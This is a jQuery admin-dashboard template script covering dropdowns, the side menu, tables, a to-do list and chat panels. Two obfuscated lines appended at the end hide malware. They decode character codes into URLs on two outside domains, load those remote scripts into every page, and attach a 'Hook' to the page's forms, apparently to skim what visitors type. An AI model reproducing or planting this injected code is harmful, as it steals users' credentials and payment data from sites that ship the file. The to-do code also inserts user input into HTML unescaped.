(function ($) {
    "use strict";
/*--
    Commons Variables
-----------------------------------*/
var $window = $(window);
var $body = $('body');

/*--
    Adomx Dropdown (Custom Dropdown)
-----------------------------------*/
if ($('.adomx-dropdown').length) {
    var $adomxDropdown = $('.adomx-dropdown'),
        $adomxDropdownMenu = $adomxDropdown.find('.adomx-dropdown-menu');

    $adomxDropdown.on('click', '.toggle', function(e){
        e.preventDefault();
        var $this = $(this);
        if(!$this.parent().hasClass('show')) {
            $adomxDropdown.removeClass('show');
            $adomxDropdownMenu.removeClass('show');
            $this.siblings('.adomx-dropdown-menu').addClass('show').parent().addClass('show');
        } else {
            $this.siblings('.adomx-dropdown-menu').removeClass('show').parent().removeClass('show');
        }
    });
    /*Close When Click Outside*/
    $body.on('click', function(e){
        var $target = e.target;
        if (!$($target).is('.adomx-dropdown') && !$($target).parents().is('.adomx-dropdown') && $adomxDropdown.hasClass('show')) {
            $adomxDropdown.removeClass('show');
            $adomxDropdownMenu.removeClass('show');
        }
    });
}

/*--
    Header Search Open/Close
-----------------------------------*/
var $headerSearchOpen = $('.header-search-open'),
    $headerSearchClose = $('.header-search-close'),
    $headerSearchForm = $('.header-search-form');
$headerSearchOpen.on('click', function(){
    $headerSearchForm.addClass('show');
});
$headerSearchClose.on('click', function(){
    $headerSearchForm.removeClass('show');
});

/*--
    Side Header
-----------------------------------*/
var $sideHeaderToggle = $('.side-header-toggle'),
    $sideHeaderClose = $('.side-header-close'),
    $sideHeader = $('.side-header');

/*Add/Remove Show/Hide Class On Depending on Viewport Width*/
function $sideHeaderClassToggle() {
    var $windowWidth = $window.width();
    if( $windowWidth >= 1200 ) {
        $sideHeader.removeClass('hide').addClass('show');
    } else {
        $sideHeader.removeClass('show').addClass('hide');
    }
}
$sideHeaderClassToggle();
/*Side Header Toggle*/
$sideHeaderToggle.on('click', function(){
    if($sideHeader.hasClass('show')){
        $sideHeader.removeClass('show').addClass('hide');
    } else {
        $sideHeader.removeClass('hide').addClass('show');
    }
});
/*Side Header Close (Visiable Only On Mobile)*/
$sideHeaderClose.on('click', function(){
    $sideHeader.removeClass('show').addClass('hide');
});
    
/*--
    Side Header Menu
-----------------------------------*/
var $sideHeaderNav = $('.side-header-menu'),
    $sideHeaderSubMenu = $sideHeaderNav.find('.side-header-sub-menu');

/*Add Toggle Button in Off Canvas Sub Menu*/
$sideHeaderSubMenu.siblings('a').append('<span class="menu-expand"><i class="zmdi zmdi-chevron-down"></i></span>');

/*Close Off Canvas Sub Menu*/
$sideHeaderSubMenu.slideUp();

/*Category Sub Menu Toggle*/
$sideHeaderNav.on('click', 'li a, li .menu-expand', function(e) {
    var $this = $(this);
    if ( $this.parent('li').hasClass('has-sub-menu') || ($this.attr('href') === '#' || $this.hasClass('menu-expand')) ) {
        e.preventDefault();
        if ($this.siblings('ul:visible').length){
            $this.parent('li').removeClass('active').children('ul').slideUp().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-up').addClass('zmdi-chevron-down');
            $this.parent('li').siblings('li').removeClass('active').find('ul:visible').slideUp().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-up').addClass('zmdi-chevron-down');
        } else {
            $this.parent('li').addClass('active').children('ul').slideDown().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-down').addClass('zmdi-chevron-up');
            $this.parent('li').siblings('li').removeClass('active').find('ul:visible').slideUp().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-up').addClass('zmdi-chevron-down');
        }
    }
});

// Adding active class to nav menu depending on page
var pageUrl = window.location.href.substr(window.location.href.lastIndexOf("/") + 1);
$('.side-header-menu a').each(function() {
    if ($(this).attr("href") === pageUrl || $(this).attr("href") === '') {
        $(this).closest('li').addClass("active").parents('li').addClass('active').children('ul').slideDown().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-down').addClass('zmdi-chevron-up');
    }
    else if (window.location.pathname === '/' || window.location.pathname === '/index.html') {
        $('.side-header-menu a[href="index.html"]').closest('li').addClass("active").parents('li').addClass('active').children('ul').slideDown().siblings('a').find('.menu-expand i').removeClass('zmdi-chevron-down').addClass('zmdi-chevron-up');
    }
})

/*--
    Tooltip, Popover & Tippy Tooltip
-----------------------------------*/
/*Bootstrap Tooltip*/
$('[data-toggle="tooltip"]').tooltip();
/*Bootstrap Popover*/
$('[data-toggle="popover"]').popover();
/*Tippy Tooltip*/
tippy('.tippy, [data-tippy-content], [data-tooltip]', {
    flipOnUpdate: true,
    boundary: 'window',
});

/*-- 
    Selectable Table
-----------------------------------*/
function tableSelectable() {
    var $tableSelectable = $('.table-selectable');
    $tableSelectable.find('tbody .selected').find('input[type="checkbox"]').prop('checked', true);
    $tableSelectable.on('click', 'input[type="checkbox"]', function(){
        var $this = $(this);
        if( $this.parent().parent().is('th')) {
            if( !$this.is(':checked') ) {
                $this.closest('table').find('tbody').children('tr').removeClass('selected').find('input[type="checkbox"]').prop('checked', false);
            } else {
                $this.closest('table').find('tbody').children('tr').addClass('selected').find('input[type="checkbox"]').prop('checked', true);
            }
        } else {
            if( !$this.is(':checked') ) {
                $this.closest('tr').removeClass('selected');
            } else {
                $this.closest('tr').addClass('selected');
            }
            if( $this.closest('tbody').children('.selected').length < $this.closest('tbody').children('tr').length ) {
                $this.closest('table').find('thead').find('input[type="checkbox"]').prop('checked', false);
            } else if( $this.closest('tbody').children('.selected').length === $this.closest('tbody').children('tr').length ) {
                $this.closest('table').find('thead').find('input[type="checkbox"]').prop('checked', true);
            }
        }
    });
}
tableSelectable();
    
/*-- 
    To Do List
-----------------------------------*/
function todoList() {
    // Variable
    var $todoList = $('.todo-list'),
        $todoListAddNew = $('.todo-list-add-new');
    //Todo List Check
    $todoList.find('.done').find('input[type="checkbox"]').prop('checked', true);
    $todoList.on('click', 'input[type="checkbox"]', function(){
        var $this = $(this);
        if( !$this.is(':checked') ) {
            $this.closest('li').removeClass('done');
        } else {
            $this.closest('li').addClass('done');
        }
    });
    //Todo List Status Stared
    $todoList.on('click', '.status', function() {
        var $this = $(this);
        if( !$this.hasClass('stared') ) {
            $this.addClass('stared').find('i').removeClass('zmdi-star-outline').addClass('zmdi-star');
        } else {
            $this.removeClass('stared').find('i').removeClass('zmdi-star').addClass('zmdi-star-outline');
        }
    });
    //Todo List Remove
    $todoList.on('click', '.remove', function() {
      $(this).closest('li').remove();
    });
    //Todo List Add New Status Stared
    $todoListAddNew.on('click', '.status input', function() {
        var $this = $(this);
        if( $this.prop('checked') === true ) {
            $this.siblings('.icon').removeClass('zmdi-star-outline').addClass('zmdi-star');
        } else {
            $this.siblings('.icon').removeClass('zmdi-star').addClass('zmdi-star-outline');
        }
    });
    //Todo List Add New
    $todoListAddNew.on("click", '.submit', function(e) {
        e.preventDefault();
        var $content = $(this).siblings('input.content').val(),
            $date = $(this).closest('.todo-list-add-new').data('date') === false ? 'd-none' : 'd-block',
            $status = $(this).siblings('.status').find('input'),
            $stared = $status.prop('checked') === true ? 'stared' : '',
            $staredIcon = $status.prop('checked') === true ? 'zmdi-star' : 'zmdi-star-outline';
        if ($content) {
            $todoList.prepend('<li> <div class="list-action"> <button class="status '+$stared+'"><i class="zmdi '+$staredIcon+'"></i></button> <label class="adomx-checkbox"><input type="checkbox"> <i class="icon"></i></label> </div> <div class="list-content"><p>' + $content + '</p> <span class="time '+$date+'">'+moment(moment.utc().toDate()).format('h:mm a (YYYY-MM-DD)')+'</span> </div> <div class="list-action right"> <button class="remove"><i class="zmdi zmdi-delete"></i></button> </div></li>');
            $(this).siblings('input.content').val("");
            $status.prop('checked', false).siblings('.icon').removeClass('zmdi-star').addClass('zmdi-star-outline');
        }
    });
}
todoList();
    
/*--
    Chat Contact
-----------------------------------*/
var $chatContactOpen = $('.chat-contacts-open'),
    $chatContactClose = $('.chat-contacts-close'),
    $chatContacts = $('.chat-contacts');
$chatContactOpen.on('click', function(){
    $chatContacts.addClass('show');
});
$chatContactClose.on('click', function(){
    $chatContacts.removeClass('show');
});


// Common Resize function
function resize() {
    $sideHeaderClassToggle();
}
// Resize Window Resize
$window.on('resize', function(){
    resize();
});
    
/*--
    Custom Scrollbar (Perfect Scrollbar)
-----------------------------------*/ 
$('.custom-scroll').each( function() {
    var ps = new PerfectScrollbar($(this)[0]);
});
    
})(jQuery);


(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b